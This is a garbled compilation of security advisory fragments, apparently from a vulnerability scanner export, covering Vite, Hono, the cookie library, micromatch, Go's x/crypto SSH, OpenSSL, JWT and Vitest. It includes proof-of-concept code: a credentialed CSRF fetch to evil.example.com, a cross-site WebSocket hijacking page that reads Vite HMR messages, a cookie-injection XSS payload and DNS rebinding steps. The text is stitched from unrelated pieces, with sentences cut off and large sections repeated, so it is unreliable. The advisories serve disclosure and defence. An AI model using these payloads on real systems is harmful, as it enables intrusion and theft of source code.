      `require.toUrl('${escapeId(relativePath)}'), document.baseURI`
    );
  },
  cjs: (relativePath) => `(typeof document === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath)})`,
  es: (relativePath) => getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', import.meta.url`
  ),
  iife: (relativePath) => getRelativeUrlFromDocument(relativePath),
  // NOTE: make sure rollup generate `module` params
  system: (relativePath) => getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', module.meta.url`
  ),
  umd: (relativePath) => `(typeof document === 'undefined' && typeof location === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath, true)})`
};
```

### PoC

Considering a website that contains the following `main.js` script, the devloper decides to use the Vite to bundle up the program with the following configuration. 

```
// main.js
import extraURL from './extra.js?url'
var s = document.createElement('script')
s.src = extraURL
document.head.append(s)
```

```
// extra.js
export default ""https://myserver/justAnOther.js""
```

```
// vite.config.js
import { defineConfig } from 'vite'

export default defineConfig({
  build: {
    assetsInlineLimit: 0, // To avoid inline assets for PoC
    rollupOptions: {
      output: {
        format: ""cjs""
      },
    },
  },
  base: ""./"",
});
```

After running the build command, the developer will get following bundle as the output.

```
// dist/index-DDmIg9VD.js
""use strict"";const t=""""+(typeof document>""u""?require(""url"").pathToFileURL(__dirname+""/extra-BLVEx9Lb.js"").href:new URL(""extra-BLVEx9Lb.js"",document.currentScript&&document.currentScript.src||document.baseURI).href);var e=document.createElement(""script"");e.src=t;document.head.append(e);
```

Adding the Vite bundled script, `dist/index-DDmIg9VD.js`, as part of the web page source code, the page could load the `extra.js` file from the attacker's domain, `attacker.controlled.server`. The attacker only needs to insert an `img` tag with the `name` attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.


```

```

### Impact

This vulnerability can result in cross-site scripting (XSS) attacks on websites that include Vite-bundled files (configured with an output format of `cjs`, `iife`, or `umd`) and allow users to inject certain scriptless HTML tags without properly sanitizing the name or id attributes.

The cookie name could be used to set other fields of the cookie, resulting in an unexpected cookie value. For example, `serialize(""userName=<script>alert('XSS3')</script>; Max-Age=2592000; a"", value)` would result in `""userName=<script>alert('XSS3')</script>; Max-Age=2592000; a=test""`, setting `userName` cookie to `<script>` and ignoring `value`.

A similar escape can be used for `path` and `domain`, which could be abused to alter other fields of the cookie.

Upgrade to 0.7.0, which updates the validation for `name`, `path`, and `domain`.

Bypass CSRF Middleware by a request without Content-Type herader.

### Details
Although the csrf middleware verifies the Content-Type Header, Hono always considers a request without a Content-Type header to be safe.

https://github.com/honojs/hono/blob/cebf4e87f3984a6a034e60a43f542b4c5225b668/src/middleware/csrf/index.ts#L76-L89

### PoC
```server.js
// server.js
import { Hono } from 'hono'
import { csrf }from 'hono/csrf'
const app = new Hono()
app.use(csrf())
app.get('/', (c) => {
  return c.html('Hello Hono!')
})
app.post('/', async (c) => {
  console.log(""executed"")
  return c.text( await c.req.text())
})
Deno.serve(app.fetch)
```

```poc.html
<!-- PoC.html -->
<script>
async function myclick() {
    await fetch(""http://evil.example.com"", {
    method: ""POST"",
    credentials: ""include"",
    body:new Blob([`test`],{}),
    });
}
</script>
<input type=""button"" onclick=""myclick()"" value=""run"" />
```

Similarly, the fetch API does not add a Content-Type header for requests that do not include a Body.
```PoC2.js
await fetch(""http://localhost:8000"", { method: ""POST"", credentials: ""include""});
```

### Impact
Bypass csrf protection implemented with hono csrf middleware.

The vulnerability occurs in `micromatch.braces()` in `index.js` because the pattern `.*` will greedily match anything. By passing a malicious payload, the pattern matching will keep backtracking to the input while it doesn't find the closing bracket. As the input size increases, the consumption time will also increase until it causes the application to hang or slow down. There was a merged fix but further testing shows the issue persisted prior to https://github.com/micromatch/micromatch/pull/266.

The documentation for ServerConfig.PublicKeyCallback says that ""A call to this function does not guarantee that the key offered is in fact used to authenticate."" Specifically, the SSH protocol allows clients to inquire about whether a public key is acceptable before proving control of the corresponding private key. PublicKeyCallback may be called with multiple keys, and the order in which the keys were provided cannot be used to infer which key the client successfully authenticated with, if any. Some applications, which store the key(s) passed to PublicKeyCallback (or derived information) and make security relevant determinations based on it once the connection is established, may make incorrect assumptions.

For example, an attacker may send public keys A and B, and then authenticate with A. PublicKeyCallback would be called only twice, first with A and then with B. A vulnerable application may then make authorization decisions based on key B for which the attacker does not actually control the private key.

Since this API is widely misused, as a partial mitigation golang.org/x/crypto@v0.31.0 enforces the property that, when successfully authenticating via public key, the last key passed to ServerConfig.PublicKeyCallback will be the key used to authenticate the connection. PublicKeyCallback will now be called multiple times with the same key, if necessary. Note that the client may still not control the last key passed to PublicKeyCallback if the connection is then authenticated with a different method, such as PasswordCallback, KeyboardInteractiveCallback, or NoClientAuth.

Users should be using the Extensions field of the Permissions return value from the various authentication callbacks to record data associated with the authentication attempt instead of referencing external state. Once the connection is established the state corresponding to the successful authentication attempt can be retrieved via the ServerConn.Permissions field. Note that some third-party libraries misuse the Permissions type by sharing it across authentication attempts; users of third-party libraries should refer to the relevant projects for guidance.",go-golang.org/x/crypto,< 0.31.0,0.31.0,Update go-golang.org/x/crypto from < 0.31.0 to 0.31.0.,Critical,1/13/2025,12/12/2024,Fixable

The cookie name could be used to set other fields of the cookie, resulting in an unexpected cookie value. For example, `serialize(""userName=<script>alert('XSS3')</script>; Max-Age=2592000; a"", value)` would result in `""userName=<script>alert('XSS3')</script>; Max-Age=2592000; a=test""`, setting `userName` cookie to `<script>` and ignoring `value`.

A similar escape can be used for `path` and `domain`, which could be abused to alter other fields of the cookie.

### Patches

Upgrade to 0.7.0, which updates the validation for `name`, `path`, and `domain`.

### Workarounds

Avoid passing untrusted or arbitrary values for these fields, ensure they are set by the application instead of user input.

The group contains a list of ACLs. In turn, each ACL points to a different TCAM region where the filters are stored. During forwarding, the ACLs are sequentially evaluated until a match is found.  One reason to place filters in different regions is when they are added with decreasing priorities and in an alternating order so that two consecutive filters can never fit in the same region because of their key usage.  In Spectrum-2 and newer ASICs the firmware started to report that the maximum number of ACLs in a group is more than 16, but the layout of the register that configures ACL groups (PAGT) was not updated to account for that. It is therefore possible to hit stack corruption [1] in the rare case where more than 16 ACLs in a group are required.  Fix by limiting the maximum ACL group size to the minimum between what the firmware reports and the maximum ACLs that fit in the PAGT register.

The group contains a list of ACLs. In turn, each ACL points to a different TCAM region where the filters are stored. During forwarding, the ACLs are sequentially evaluated until a match is found.  One reason to place filters in different regions is when they are added with decreasing priorities and in an alternating order so that two consecutive filters can never fit in the same region because of their key usage.  In Spectrum-2 and newer ASICs the firmware started to report that the maximum number of ACLs in a group is more than 16, but the layout of the register that configures ACL groups (PAGT) was not updated to account for that. It is therefore possible to hit stack corruption [1] in the rare case where more than 16 ACLs in a group are required.  Fix by limiting the maximum ACL group size to the minimum between what the firmware reports and the maximum ACLs that fit in the PAGT register.  Add a test case to make sure the machine does not crash when this condition is hit.

This contrasts with normal C strings which are repesented as a buffer for the string data which is terminated with a NUL (0) byte. Although not a strict requirement, ASN.1 strings that are parsed using OpenSSL's own ""d2i"" functions (and other similar parsing functions) as well as any string whose value has been set with the ASN1_STRING_set() function will additionally NUL terminate the byte array in the ASN1_STRING structure. However, it is possible for applications to directly construct valid ASN1_STRING structures which do not NUL terminate the byte array by directly setting the ""data"" and ""length"" fields in the ASN1_STRING array. This can also happen by using the ASN1_STRING_set0() function. Numerous OpenSSL functions that print ASN.1 data have been found to assume that the ASN1_STRING byte array will be NUL terminated, even though this is not guaranteed for strings that have been directly constructed. Where an application requests an ASN.1 structure to be printed, and where that ASN.1 structure contains ASN1_STRINGs that have been directly constructed by the application without NUL terminating the ""data"" field, then a read buffer overrun can occur. The same thing can also occur during name constraints processing of certificates (for example if a certificate has been directly constructed by the application instead of loading it via the OpenSSL parsing functions, and the certificate contains non NUL terminated ASN1_STRING structures). It can also occur in the X509_get1_email(), X509_REQ_get1_email() and X509_get1_ocsp() functions. If a malicious actor can cause an application to directly construct an ASN1_STRING and then process it through one of the affected OpenSSL functions then this issue could be hit.

The NRDelegation Attack works by having a malicious delegation with a considerable number of non responsive nameservers.

The attack can cause a resolver to spend a lot of time/resources resolving records under a malicious delegation point where a considerable number of unresponsive NS records reside.

674,acme-inc-lambda,577569741,acme-inc-Education,CVE-2024-51744,github,3.1,Bad documentation of error handling in ParseWithClaims can lead to potentially dangerous situations,"### Summary

Unclear documentation of the error behavior in `ParseWithClaims` can lead to situation where users are potentially not checking errors in the way they should be. Especially, if a token is both expired and invalid, the errors returned by `ParseWithClaims` return both error codes. If users only check for the `jwt.ErrTokenExpired ` using `error.Is`, they will ignore the embedded `jwt.ErrTokenSignatureInvalid` and thus potentially accept invalid tokens.

### Fix

We have back-ported the error handling logic from the `v5` branch to the `v4` branch. In this logic, the `ParseWithClaims` function will immediately return in ""dangerous"" situations (e.g., an invalid signature), limiting the combined errors only to situations where the signature is valid, but further validation failed (e.g., if the signature is valid, but is expired AND has the wrong audience). This fix is part of the 4.5.1 release.

### Workaround 

We are aware that this changes the behaviour of an established function and is not 100 % backwards compatible, so updating to 4.5.1 might break your code. In case you cannot update to 4.5.0, please make sure that you are properly checking for all errors (""dangerous"" ones first), so that you are not running in the case detailed above.

```Go
token, err := /* jwt.Parse or similar */
if token.Valid {
	fmt.Println(""You look nice today"")
} else if errors.Is(err, jwt.ErrTokenMalformed) {
	fmt.Println(""That's not even a token"")
} else if errors.Is(err, jwt.ErrTokenUnverifiable) {
	fmt.Println(""We could not verify this token"")
} else if errors.Is(err, jwt.ErrTokenSignatureInvalid) {
	fmt.Println(""This token has an invalid signature"")
} else if errors.Is(err, jwt.ErrTokenExpired) || errors.Is(err, jwt.ErrTokenNotValidYet) {
	// Token is either expired or not active yet
	fmt.Println(""Timing is everything"")
} else {
	fmt.Println(""Couldn't handle this token:"", err)

The regular expression that is vulnerable to backtracking can be generated in the 0.1.x release of `path-to-regexp`, originally reported in CVE-2024-45296

### Patches

Upgrade to 0.1.12.

### Workarounds

Avoid using two parameters within a single path segment, when the separator is not `.` (e.g. no `/:a-:b`). Alternatively, you can define the regex used for both parameters and ensure they do not overlap to allow backtracking.

Arbitrary remote Code Execution when accessing a malicious website while Vitest API server is listening by Cross-site WebSocket hijacking (CSWSH) attacks.

### Details
When [`api` option](https://vitest.dev/config/#api) is enabled (Vitest UI enables it), Vitest starts a WebSocket server. This WebSocket server did not check Origin header and did not have any authorization mechanism and was vulnerable to CSWSH attacks.
https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46

This WebSocket server has `saveTestFile` API that can edit a test file and `rerun` API that can rerun the tests. An attacker can execute arbitrary code by injecting a code in a test file by the `saveTestFile` API and then running that file by calling the `rerun` API.
https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76

### PoC
1. Open Vitest UI.
2. Access a malicious web site with the script below.
3. If you have `calc` executable in `PATH` env var (you'll likely have it if you are running on Windows), that application will be executed.

An application that calls DH_check() and supplies a key or parameters obtained from an untrusted source could be vulnerable to a Denial of Service attack.  The function DH_check() is itself called by a number of other OpenSSL functions. An application calling any of those other functions may similarly be affected. The other functions affected by this are DH_check_ex() and EVP_PKEY_param_check().  Also vulnerable are the OpenSSL dhparam and pkeyparam command line applications when using the ""-check"" option.  The OpenSSL SSL/TLS implementation is not affected by this issue.  The OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",openssl,1.1.1d-0+deb10u6,,,Medium,3/7/2025,4/6/2024,Fixable

Impact summary: Applications that use OBJ_obj2txt() directly, or use any of the OpenSSL subsystems OCSP, PKCS7/SMIME, CMS, CMP/CRMF or TS with no message size limit may experience notable to very long delays when processing those messages, which may lead to a Denial of Service.  An OBJECT IDENTIFIER is composed of a series of numbers - sub-identifiers - most of which have no size limit.  OBJ_obj2txt() may be used to translate an ASN.1 OBJECT IDENTIFIER given in DER encoding form (using the OpenSSL type ASN1_OBJECT) to its canonical numeric text form, which are the sub-identifiers of the OBJECT IDENTIFIER in decimal form, separated by periods.  When one of the sub-identifiers in the OBJECT IDENTIFIER is very large (these are sizes that are seen as absurdly large, taking up tens or hundreds of KiBs), the translation to a decimal number in text may take a very long time.  The time complexity is O(n^2) with 'n' being the size of the sub-identifiers in bytes (*).  With OpenSSL 3.0, support to fetch cryptographic algorithms using names / identifiers in string form was introduced.  This includes using OBJECT IDENTIFIERs in canonical numeric text form as identifiers for fetching algorithms.

It also impacts anything that processes X.509 certificates, including simple things like verifying its signature.  The impact on TLS is relatively low, because all versions of OpenSSL have a 100KiB limit on the peer's certificate chain.  Additionally, this only impacts clients, or servers that have explicitly enabled client authentication.

Vite allowed any websites to send any requests to the development server and read the response due to default CORS settings and lack of validation on the Origin header for WebSocket connections.

> [!WARNING]
> This vulnerability even applies to users that only run the Vite dev server on the local machine.

### Upgrade Path
Users that does not match either of the following conditions should be able to upgrade to a newer version of Vite that fixes the vulnerability without any additional configuration.

- Using the backend integration feature
- Using a reverse proxy in front of Vite
- Accessing the development server via a domain other than `localhost` or `*.localhost`
- Using a plugin / framework that connects to the WebSocket server on their own from the browser

#### Using the backend integration feature
If you are using the backend integration feature and not setting [`server.origin`](https://vite.dev/config/server-options.html#server-origin), you need to add the origin of the backend server to the [`server.cors.origin`](https://github.com/expressjs/cors#configuration-options) option. Make sure to set a specific origin rather than `*`, otherwise any origin can access your development server.

#### Using a reverse proxy in front of Vite
If you are using a reverse proxy in front of Vite and sending requests to Vite with a hostname other than `localhost` or `*.localhost`, you need to add the hostname to the new [`server.allowedHosts`](https://vite.dev/config/server-options.html#server-allowedhosts) option. For example, if the reverse proxy is sending requests to `http://vite:5173`, you need to add `vite` to the `server.allowedHosts` option.

#### Accessing the development server via a domain other than `localhost` or `*.localhost`
You need to add the hostname to the new [`server.allowedHosts`](https://vite.dev/config/server-options.html#server-allowedhosts) option. For example, if you are accessing the development server via `http://foo.example.com:8080`, you need to add `foo.example.com` to the `server.allowedHosts` option.

#### Using a plugin / framework that connects to the WebSocket server on their own from the browser
If you are using a plugin / framework, try upgrading to a newer version of Vite that fixes the vulnerability. If the WebSocket connection appears not to be working, the plugin / framework may have a code that connects to the WebSocket server on their own from the browser.

In that case, you can either:

- fix the plugin / framework code to the make it compatible with the new version of Vite
- set `legacy.skipWebSocketTokenCheck: true` to opt-out the fix for [2] while the plugin / framework is incompatible with the new version of Vite
  - When enabling this option, **make sure that you are aware of the security implications** described in the impact section of [2] above.

### Mitigation without upgrading Vite
#### [1]: Permissive default CORS settings
Set `server.cors` to `false` or limit `server.cors.origin` to trusted origins.

#### [2]: Lack of validation on the Origin header for WebSocket connections
There aren't any mitigations for this.

#### [3]: Lack of validation on the Host header for HTTP requests
Use Chrome 94+ or use HTTPS for the development server.

### Details

There are three causes that allowed malicious websites to send any requests to the development server:

#### [1]: Permissive default CORS settings

Vite sets the [`Access-Control-Allow-Origin`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin) header depending on [`server.cors`](https://vite.dev/config/server-options.html#server-cors) option. The default value was `true` which sets `Access-Control-Allow-Origin: *`. This allows websites on any origin to `fetch` contents served on the development server.

Attack scenario:

1. The attacker serves a malicious web page (`http://malicious.example.com`).
2. The user accesses the malicious web page.
3. The attacker sends a `fetch('http://127.0.0.1:5173/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.
4. The attacker gets the content of `http://127.0.0.1:5173/main.js`.

#### [2]: Lack of validation on the Origin header for WebSocket connections

Vite starts a WebSocket server to handle HMR and other functionalities. This WebSocket server [did not perform validation on the Origin header](https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/src/node/server/ws.ts#L145-L157) and was vulnerable to Cross-Site WebSocket Hijacking (CSWSH) attacks. With that attack, an attacker can read and write messages on the WebSocket connection. Vite only sends some information over the WebSocket connection ([list of the file paths that changed, the file content where the errored happened, etc.](https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/types/hmrPayload.d.ts#L12-L72)), but plugins can send arbitrary messages and may include more sensitive information.

Attack scenario:

1. The attacker serves a malicious web page (`http://malicious.example.com`).
2. The user accesses the malicious web page.
3. The attacker runs `new WebSocket('http://127.0.0.1:5173', 'vite-hmr')` by JS in that malicious web page.
4. The user edits some files.
5. Vite sends some HMR messages over WebSocket.
6. The attacker gets the content of the HMR messages.

#### [3]: Lack of validation on the Host header for HTTP requests

Unless [`server.https`](https://vite.dev/config/server-options.html#server-https) is set, Vite starts the development server on HTTP. Non-HTTPS servers are vulnerable to DNS rebinding attacks without validation on the Host header. But Vite did not perform validation on the Host header. By exploiting this vulnerability, an attacker can send arbitrary requests to the development server bypassing the same-origin policy.

1. The attacker serves a malicious web page that is served on **HTTP** (`http://malicious.example.com:5173`) (HTTPS won't work).
2. The user accesses the malicious web page.
3. The attacker changes the DNS to point to 127.0.0.1 (or other private addresses).
4. The attacker sends a `fetch('/main.js')` request by JS in that malicious web page.
5. The attacker gets the content of `http://127.0.0.1:5173/main.js` bypassing the same origin policy.

### Impact
#### [1]: Permissive default CORS settings
Users with the default `server.cors` option may:

- get the source code stolen by malicious websites
- give the attacker access to functionalities that are not supposed to be exposed externally
  - Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind `server.proxy` may have those functionalities.

#### [2]: Lack of validation on the Origin header for WebSocket connections
All users may get the file paths of the files that changed and the file content where the error happened be stolen by malicious websites.

For users that is using a plugin that sends messages over WebSocket, that content may be stolen by malicious websites.

For users that is using a plugin that has a functionality that is triggered by messages over WebSocket, that functionality may be exploited by malicious websites.

#### [3]: Lack of validation on the Host header for HTTP requests
Users using HTTP for the development server and using a browser that is not Chrome 94+ may:

- get the source code stolen by malicious websites
- give the attacker access to functionalities that are not supposed to be exposed externally
  - Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind `server.proxy` may have those functionalities.

Chrome 94+ users are not affected for [3], because [sending a request to a private network page from public non-HTTPS page is forbidden](https://developer.chrome.com/blog/private-network-access-update#chrome_94) since Chrome 94.

### Related Information
Safari has [a bug that blocks requests to loopback addresses from HTTPS origins](https://bugs.webkit.org/show_bug.cgi?id=171934). This means when the user is using Safari and Vite is listening on lookback addresses, there's another condition of ""the malicious web page is served on HTTP"" to make [1] and [2] to work.

### PoC
#### [2]: Lack of validation on the Origin header for WebSocket connections
1. I used the `react` template which utilizes HMR functionality.

```
npm create vite@latest my-vue-app-react -- --template react
```

2. Then on a malicious server, serve the following POC html:
```html
<!doctype html>
<html lang=""en"">
    <head>
        <meta charset=""utf-8"" />
        <title>vite CSWSH</title>
    </head>
    <body>
        <div id=""logs""></div>
        <script>
            const div = document.querySelectorAll('#logs')[0];
            const ws = new WebSocket('ws://localhost:5173','vite-hmr');
            ws.onmessage = event => {
                const logLine = document.createElement('p');
                logLine.innerHTML = event.data;
                div.append(logLine);
            };
        </script>
    </body>
</html>
```

3. Kick off Vite 

```
npm run dev
```

4. Load the development server (open `http://localhost:5173/`) as well as the malicious page in the browser. 
5. Edit `src/App.jsx` file and intentionally place a syntax error
6. Notice how the malicious page can view the websocket messages and a snippet of the source code is exposed

Here's a video demonstrating the POC:

### Upgrade Path
Users that does not match either of the following conditions should be able to upgrade to a newer version of Vite that fixes the vulnerability without any additional configuration.

- Using the backend integration feature
- Using a reverse proxy in front of Vite
- Accessing the development server via a domain other than `localhost` or `*.localhost`
- Using a plugin / framework that connects to the WebSocket server on their own from the browser

#### Using the backend integration feature
If you are using the backend integration feature and not setting [`server.origin`](https://vite.dev/config/server-options.html#server-origin), you need to add the origin of the backend server to the [`server.cors.origin`](https://github.com/expressjs/cors#configuration-options) option. Make sure to set a specific origin rather than `*`, otherwise any origin can access your development server.

#### Using a reverse proxy in front of Vite
If you are using a reverse proxy in front of Vite and sending requests to Vite with a hostname other than `localhost` or `*.localhost`, you need to add the hostname to the new [`server.allowedHosts`](https://vite.dev/config/server-options.html#server-allowedhosts) option. For example, if the reverse proxy is sending requests to `http://vite:5173`, you need to add `vite` to the `server.allowedHosts` option.

#### Accessing the development server via a domain other than `localhost` or `*.localhost`
You need to add the hostname to the new [`server.allowedHosts`](https://vite.dev/config/server-options.html#server-allowedhosts) option. For example, if you are accessing the development server via `http://foo.example.com:8080`, you need to add `foo.example.com` to the `server.allowedHosts` option.

#### Using a plugin / framework that connects to the WebSocket server on their own from the browser
If you are using a plugin / framework, try upgrading to a newer version of Vite that fixes the vulnerability. If the WebSocket connection appears not to be working, the plugin / framework may have a code that connects to the WebSocket server on their own from the browser.

In that case, you can either:

  - When enabling this option, **make sure that you are aware of the security implications** described in the impact section of [2] above.

### Mitigation without upgrading Vite
#### [1]: Permissive default CORS settings
Set `server.cors` to `false` or limit `server.cors.origin` to trusted origins.

#### [2]: Lack of validation on the Origin header for WebSocket connections
There aren't any mitigations for this.

#### [3]: Lack of validation on the Host header for HTTP requests

### Details

There are three causes that allowed malicious websites to send any requests to the development server:

The default value was `true` which sets `Access-Control-Allow-Origin: *`. This allows websites on any origin to `fetch` contents served on the development server.

Attack scenario:

1. The attacker serves a malicious web page (`http://malicious.example.com`).
2. The user accesses the malicious web page.
3. The attacker sends a `fetch('http://127.0.0.1:5173/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.
4. The attacker gets the content of `http://127.0.0.1:5173/main.js`.

Attack scenario:

1. The attacker serves a malicious web page (`http://malicious.example.com`).
2. The user accesses the malicious web page.
3. The attacker runs `new WebSocket('http://127.0.0.1:5173', 'vite-hmr')` by JS in that malicious web page.
4. The user edits some files.
5. Vite sends some HMR messages over WebSocket.
6. The attacker gets the content of the HMR messages.

#### [3]: Lack of validation on the Host header for HTTP requests

Unless [`server.https`](https://vite.dev/config/server-options.html#server-https) is set, Vite starts the development server on HTTP.

2. The user accesses the malicious web page.
3. The attacker changes the DNS to point to 127.0.0.1 (or other private addresses).
4. The attacker sends a `fetch('/main.js')` request by JS in that malicious web page.
5. The attacker gets the content of `http://127.0.0.1:5173/main.js` bypassing the same origin policy.

### Impact
#### [1]: Permissive default CORS settings
Users with the default `server.cors` option may:

- get the source code stolen by malicious websites
- give the attacker access to functionalities that are not supposed to be exposed externally
  - Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind `server.proxy` may have those functionalities.

#### [2]: Lack of validation on the Origin header for WebSocket connections
All users may get the file paths of the files that changed and the file content where the error happened be stolen by malicious websites.

For users that is using a plugin that sends messages over WebSocket, that content may be stolen by malicious websites.

For users that is using a plugin that has a functionality that is triggered by messages over WebSocket, that functionality may be exploited by malicious websites.

#### [3]: Lack of validation on the Host header for HTTP requests
Users using HTTP for the development server and using a browser that is not Chrome 94+ may:

- get the source code stolen by malicious websites
- give the attacker access to functionalities that are not supposed to be exposed externally
  - Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind `server.proxy` may have those functionalities.

Chrome 94+ users are not affected for [3], because [sending a request to a private network page from public non-HTTPS page is forbidden](https://developer.chrome.com/blog/private-network-access-update#chrome_94) since Chrome 94.

### Related Information
Safari has [a bug that blocks requests to loopback addresses from HTTPS origins](https://bugs.webkit.org/show_bug.cgi?id=171934). This means when the user is using Safari and Vite is listening on lookback addresses, there's another condition of ""the malicious web page is served on HTTP"" to make [1] and [2] to work.

1. I used the `react` template which utilizes HMR functionality.

```
npm create vite@latest my-vue-app-react -- --template react
```

2. Then on a malicious server, serve the following POC html:
```html
<!doctype html>
<html lang=""en"">
    <head>
        <meta charset=""utf-8"" />
        <title>vite CSWSH</title>
    </head>
    <body>
        <div id=""logs""></div>
        <script>
            const div = document.querySelectorAll('#logs')[0];
            const ws = new WebSocket('ws://localhost:5173','vite-hmr');
            ws.onmessage = event => {
                const logLine = document.createElement('p');
                logLine.innerHTML = event.data;
                div.append(logLine);
            };
        </script>
    </body>
</html>
```

3. Kick off Vite 

```
npm run dev
```

4. Load the development server (open `http://localhost:5173/`) as well as the malicious page in the browser. 
5. Edit `src/App.jsx` file and intentionally place a syntax error
6. Notice how the malicious page can view the websocket messages and a snippet of the source code is exposed

Vite allowed any websites to send any requests to the development server and read the response due to default CORS settings and lack of validation on the Origin header for WebSocket connections.

> [!WARNING]
> This vulnerability even applies to users that only run the Vite dev server on the local machine.

### Upgrade Path
Users that does not match either of the following conditions should be able to upgrade to a newer version of Vite that fixes the vulnerability without any additional configuration.

- Using the backend integration feature
- Using a reverse proxy in front of Vite
- Accessing the development server via a domain other than `localhost` or `*.localhost`
- Using a plugin / framework that connects to the WebSocket server on their own from the browser

#### Using the backend integration feature
If you are using the backend integration feature and not setting [`server.origin`](https://vite.dev/config/server-options.html#server-origin), you need to add the origin of the backend server to the [`server.cors.origin`](https://github.com/expressjs/cors#configuration-options) option. Make sure to set a specific origin rather than `*`, otherwise any origin can access your development server.

#### Using a reverse proxy in front of Vite
If you are using a reverse proxy in front of Vite and sending requests to Vite with a hostname other than `localhost` or `*.localhost`, you need to add the hostname to the new [`server.allowedHosts`](https://vite.dev/config/server-options.html#server-allowedhosts) option. For example, if the reverse proxy is sending requests to `http://vite:5173`, you need to add `vite` to the `server.allowedHosts` option.

#### Accessing the development server via a domain other than `localhost` or `*.localhost`
You need to add the hostname to the new [`server.allowedHosts`](https://vite.dev/config/server-options.html#server-allowedhosts) option. For example, if you are accessing the development server via `http://foo.example.com:8080`, you need to add `foo.example.com` to the `server.allowedHosts` option.

#### Using a plugin / framework that connects to the WebSocket server on their own from the browser
If you are using a plugin / framework, try upgrading to a newer version of Vite that fixes the vulnerability. If the WebSocket connection appears not to be working, the plugin / framework may have a code that connects to the WebSocket server on their own from the browser.

In that case, you can either:

- fix the plugin / framework code to the make it compatible with the new version of Vite
- set `legacy.skipWebSocketTokenCheck: true` to opt-out the fix for [2] while the plugin / framework is incompatible with the new version of Vite
  - When enabling this option, **make sure that you are aware of the security implications** described in the impact section of [2] above.

### Mitigation without upgrading Vite
#### [1]: Permissive default CORS settings
Set `server.cors` to `false` or limit `server.cors.origin` to trusted origins.

#### [2]: Lack of validation on the Origin header for WebSocket connections
There aren't any mitigations for this.

#### [3]: Lack of validation on the Host header for HTTP requests
Use Chrome 94+ or use HTTPS for the development server.

### Details

There are three causes that allowed malicious websites to send any requests to the development server:

#### [1]: Permissive default CORS settings

Vite sets the [`Access-Control-Allow-Origin`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin) header depending on [`server.cors`](https://vite.dev/config/server-options.html#server-cors) option. The default value was `true` which sets `Access-Control-Allow-Origin: *`. This allows websites on any origin to `fetch` contents served on the development server.

Attack scenario:

1. The attacker serves a malicious web page (`http://malicious.example.com`).
2. The user accesses the malicious web page.
3. The attacker sends a `fetch('http://127.0.0.1:5173/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.
4. The attacker gets the content of `http://127.0.0.1:5173/main.js`.

#### [2]: Lack of validation on the Origin header for WebSocket connections

Vite starts a WebSocket server to handle HMR and other functionalities. This WebSocket server [did not perform validation on the Origin header](https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/src/node/server/ws.ts#L145-L157) and was vulnerable to Cross-Site WebSocket Hijacking (CSWSH) attacks. With that attack, an attacker can read and write messages on the WebSocket connection. Vite only sends some information over the WebSocket connection ([list of the file paths that changed, the file content where the errored happened, etc.](https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/types/hmrPayload.d.ts#L12-L72)), but plugins can send arbitrary messages and may include more sensitive information.

Attack scenario:

1. The attacker serves a malicious web page (`http://malicious.example.com`).
2. The user accesses the malicious web page.
3. The attacker runs `new WebSocket('http://127.0.0.1:5173', 'vite-hmr')` by JS in that malicious web page.
4. The user edits some files.
5. Vite sends some HMR messages over WebSocket.
6. The attacker gets the content of the HMR messages.

#### [3]: Lack of validation on the Host header for HTTP requests

Unless [`server.https`](https://vite.dev/config/server-options.html#server-https) is set, Vite starts the development server on HTTP. Non-HTTPS servers are vulnerable to DNS rebinding attacks without validation on the Host header. But Vite did not perform validation on the Host header. By exploiting this vulnerability, an attacker can send arbitrary requests to the development server bypassing the same-origin policy.

1. The attacker serves a malicious web page that is served on **HTTP** (`http://malicious.example.com:5173`) (HTTPS won't work).
2. The user accesses the malicious web page.
3. The attacker changes the DNS to point to 127.0.0.1 (or other private addresses).
4. The attacker sends a `fetch('/main.js')` request by JS in that malicious web page.
5. The attacker gets the content of `http://127.0.0.1:5173/main.js` bypassing the same origin policy.
